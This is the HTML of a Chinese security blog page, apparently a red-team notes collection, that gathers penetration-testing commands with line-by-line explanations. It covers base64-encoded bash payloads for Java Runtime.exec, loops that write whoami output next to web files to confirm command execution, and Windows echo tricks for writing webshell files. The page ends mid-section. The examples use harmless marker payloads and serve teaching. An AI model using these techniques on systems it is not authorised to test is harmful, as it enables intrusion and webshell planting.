@@ -1,0 +1,1161 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="the notes record by hypnotic">
+      
+      
+        <meta name="author" content="hypnotic">
+      
+      
+        <link rel="canonical" href="https://hypnoticp.github.io/CTF/Red_Team_Commands/Article1/index.html">
+      
+      
+      
+      
+      <link rel="icon" href="../../../icons/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.42">
+    
+    
+      
+        <title>Index - hypnotic的博客</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../assets/stylesheets/main.0253249f.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:300,300i,400,400i,700,700i%7CUbuntu+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Ubuntu";--md-code-font:"Ubuntu Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#java" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../index.html" title="hypnotic的博客" class="md-header__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            hypnotic的博客
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Index
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m17.75 4.09-2.53 1.94.91 3.06-2.63-1.81-2.63 1.81.91-3.06-2.53-1.94L12.44 4l1.06-3 1.06 3zm3.5 6.91-1.64 1.25.59 1.98-1.7-1.17-1.7 1.17.59-1.98L15.75 11l2.06-.05L18.5 9l.69 1.95zm-2.28 4.95c.83-.08 1.72 1.1 1.19 1.85-.32.45-.66.87-1.08 1.27C15.17 23 8.84 23 4.94 19.07c-3.91-3.9-3.91-10.24 0-14.14.4-.4.82-.76 1.27-1.08.75-.53 1.93.36 1.85 1.19-.27 2.86.69 5.83 2.89 8.02a9.96 9.96 0 0 0 8.02 2.89m-1.64 2.02a12.08 12.08 0 0 1-7.8-3.47c-2.17-2.19-3.33-5-3.49-7.82-2.81 3.14-2.7 7.96.31 10.98 3.02 3.01 7.84 3.12 10.98.31"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep" data-md-color-accent="deep"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 7a5 5 0 0 1 5 5 5 5 0 0 1-5 5 5 5 0 0 1-5-5 5 5 0 0 1 5-5m0 2a3 3 0 0 0-3 3 3 3 0 0 0 3 3 3 3 0 0 0 3-3 3 3 0 0 0-3-3m0-7 2.39 3.42C13.65 5.15 12.84 5 12 5s-1.65.15-2.39.42zM3.34 7l4.16-.35A7.2 7.2 0 0 0 5.94 8.5c-.44.74-.69 1.5-.83 2.29zm.02 10 1.76-3.77a7.131 7.131 0 0 0 2.38 4.14zM20.65 7l-1.77 3.79a7.02 7.02 0 0 0-2.38-4.15zm-.01 10-4.14.36c.59-.51 1.12-1.14 1.54-1.86.42-.73.69-1.5.83-2.29zM12 22l-2.41-3.44c.74.27 1.55.44 2.41.44.82 0 1.63-.17 2.37-.44z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="分享" aria-label="分享" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+    
+      
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../index.html" class="md-tabs__link">
+        
+  
+    
+  
+  Home
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Code_audit/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Code_audit
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Vulnerability_analysis/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Vulnerability_analysis
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Tools/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Tools
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../index.html" class="md-tabs__link">
+          
+  
+    
+  
+  CTF
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../SRC/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  SRC
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Security_devices/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Security_devices
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../Shell_Scripts/index.html" class="md-tabs__link">
+          
+  
+    
+  
+  Shell_Scripts
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../../about.html" class="md-tabs__link">
+        
+  
+    
+  
+  About
+
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+    
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../index.html" title="hypnotic的博客" class="md-nav__button md-logo" aria-label="hypnotic的博客" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    hypnotic的博客
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/hypnoticp/hypnoticp.github.io.git" title="前往仓库" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.6.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+  </div>
+  <div class="md-source__repository">
+    hypnoticp.github.io
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../index.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Home
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Code_audit/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Code_audit
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Vulnerability_analysis/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Vulnerability_analysis
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Tools/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Tools
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    CTF
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../SRC/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    SRC
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Security_devices/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Security_devices
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+    
+    
+      
+      
+        
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+    <a href="../../../Shell_Scripts/index.html" class="md-nav__link">
+      
+  
+  <span class="md-ellipsis">
+    Shell_Scripts
+  </span>
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../about.html" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    About
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  
+  
+
+
+<p>整理收集渗透中用到的命令。</p>
+<h1 id="java">java命令执行<a class="headerlink" href="#java" title="Permanent link">&para;</a></h1>
+<p>如下编码网站：</p>
+<p>https://ares-x.com/tools/runtime-exec/
+https://r0yanx.com/tools/java_exec_encode/</p>
+<p>手动编码操作:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>bash -c {echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==}|{base64,-d}|{bash,-i}
+</code></pre></div>
+<p><img alt="截图" src="928cdc268f970ff654498cabf8adf688.png" /></p>
+<blockquote>
+<p>bash -c "echo cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==" | base64 -d | bash -i 可以在Linux上直接执行。</p>
+<p>bash -c {echo,cGluZyAxMjcuMC4wLjE7ZWNobyAxID50ZXN0LnR4dA==}|{base64,-d}|{bash,-i} 无法在Linux上直接执行。整个命令被大括号包裹，这样bash会将其中的内容视为一个命令组，而不是一个完整的命令。在Linux中，大括号通常用于构建命令组，而不是表示字符串的边界。因此，这个命令会导致语法错误，因为大括号被认为是非法字符。</p>
+</blockquote>
+<h1 id="_1">命令执行，定位资源文件写文件回显<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h1>
+<h2 id="linux">Linux<a class="headerlink" href="#linux" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>find /|grep index.js|while read f;do sh -c &quot;whoami&quot; &gt;$(dirname $f)/test.txt;done
+</code></pre></div>
+<blockquote>
+<p>find /: 这部分命令使用 find 命令来递归地搜索整个文件系统。/ 表示从根目录开始搜索。</p>
+<p>| grep index.js: 将 find 命令的输出通过管道 | 传递给 grep 命令。grep 命令用于在文本中搜索指定模式（正则表达式），这里的模式是 "index.js"。这样做的目的是筛选出包含 "index.js" 字符串的文件。</p>
+<p>while read f; do ... done: 这是一个 while 循环，它会逐行读取 grep 命令的输出（即包含 "index.js" 的文件路径），并将每一行保存在变量 f 中。</p>
+<p><code>sh -c "whoami" &gt; $(dirname $f)/test.txt</code>: 这部分是在循环中执行的操作。sh -c "whoami" 是一个子 shell 命令，它会执行 whoami 命令来获取当前用户的用户名。<code>$(dirname $f)</code>会提取变量 $f 所代表文件的目录路径。然后，&gt; 操作符将 whoami 命令的输出重定向到目录路径下的 test.txt 文件中，如果文件不存在则会创建，如果已存在则会覆盖内容。</p>
+<p>综上，这个命令的作用是在整个文件系统中搜索包含 "index.js" 字符串的文件，然后对每一个找到的文件执行 whoami 命令，将输出写入到该文件所在目录的 test.txt 文件中。</p>
+</blockquote>
+<h2 id="windows">Windows(注意盘符)<a class="headerlink" href="#windows" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>for /r D:\ %i in (index.js*) do whoami &gt; %i/../test.txt
+</code></pre></div>
+<blockquote>
+<p>作用是在指定目录（D:\）及其子目录下搜索所有以 "index.js" 开头的文件，并将当前用户的用户名写入到每个匹配文件所在目录的 test.txt 文件中。</p>
+<p><code>for /r D:\ %i in (index.js*)</code>: 这部分命令使用 for 循环来遍历指定目录（D:\）及其子目录下的所有文件。/r 表示递归搜索。%i 是循环变量，用于存储当前文件的路径。(index.js<em>) 是文件名的模式，它会匹配以 "index.js" 开头的任何文件名，</em> 表示任意后缀。</p>
+<p><code>do whoami &gt; %i/../test.txt</code>: 这部分是在循环中执行的操作。whoami 命令用于获取当前用户的用户名。&gt; 是重定向操作符，将 whoami 命令的输出重定向到指定文件。%i 是当前文件的路径，%i/../test.txt 表示将 test.txt 文件创建在当前文件所在目录的上一级目录中。</p>
+<p>因此，整个命令的作用是在指定目录及其子目录下搜索以 "index.js" 开头的文件，并在每个文件所在目录的上一级目录中创建一个名为 test.txt 的文件，其中写入当前用户的用户名。</p>
+</blockquote>
+<h1 id="shell">写shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h1>
+<p>在Windows中，批处理需要转义字符主要有"&amp;","|","&lt;","&gt;"等等，转义字符为"^"</p>
+<p>在Linux中，需要转义字符主要是单引号或者双引号 对于单引号，我们将其替换成为<code>\47</code>即可，而对于双引号，则使用\22进行转义。</p>
+<p>windows命令行最大长度为8191,16进制是113898。echo写文件时注意长度。</p>
+<h2 id="_2">方法一<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>set /p=qaxnb&lt;nul&gt;d:\1d13.txt
+</code></pre></div>
+<p><img alt="截图" src="c2004a6d5389b1bfaa7c59a0c0aa0827.png" /></p>
+<blockquote>
+<p>这个命令是一个 Windows 批处理命令，它执行以下操作：</p>
+<p><code>set /p=qaxnb&lt;nul&gt;</code>：这个部分有两个主要作用。首先，set /p 命令用于从用户输入中获取一个值并将其赋给变量。在这里，/p 表示“prompt”的意思，表示等待用户输入。但是，在 &lt;nul 之前的 qaxnb 并不是提示信息，它实际上是将 qaxnb 这个值赋给变量 %qaxnb%。&lt;nul 的作用是将输入重定向到空设备（nul），这样就不需要用户手动输入任何内容，而是从空设备读取。</p>
+<p><code>d:\1d13.txt</code>：这部分表示将变量 %qaxnb% 的值写入到文件 d:\1d13.txt 中。</p>
+<p>因此，整个命令的作用是将字符串 "qaxnb" 写入到文件 d:\1d13.txt 中。</p>
+</blockquote>
+<h2 id="_3">方法二<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>echo qaxnb&gt;1we.txt
+</code></pre></div>
+<p><img alt="截图" src="7c727b9318c599bfd3fef64a2ea60164.png" /></p>
+<h2 id="_4">追加内容<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>echo qaxcnm&gt;&gt;1we.txt
+</code></pre></div>
+<p><img alt="截图" src="4c6589f3210e5be3e839b0bbf4bd6ff4.png" /></p>
+<h2 id="_5">不换行追加内容<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>set /p=&quot;123123&quot;&gt;&gt;1we.txt
+</code></pre></div>
+<p><img alt="截图" src="a249a0d5dd9976e25c2f7cbb13f046b7.png" /></p>
+<blockquote>
